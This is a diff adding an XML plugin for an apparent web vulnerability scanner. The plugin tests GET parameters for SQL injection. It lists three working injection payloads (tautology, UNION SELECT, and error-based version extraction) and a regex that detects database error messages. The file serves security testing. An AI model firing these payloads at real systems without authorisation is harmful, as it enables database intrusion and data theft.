@@ -1,0 +1,15 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<plugin>
+    <name>SQL Injection Tester</name>
+    <version>1.0</version>
+    <author>NetRaven</author>
+    <description>Tests for SQL injection vulnerabilities in GET parameters</description>
+    <category>sqli</category>
+    <requires>curl</requires>
+    <attack type="sqli">
+        <payload>' OR '1'='1</payload>
+        <payload>' UNION SELECT NULL,NULL,NULL--</payload>
+        <payload>' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--</payload>
+        <detection>sql|syntax|mysql_fetch|ORA-|error in your SQL</detection>
+    </attack>
+</plugin>
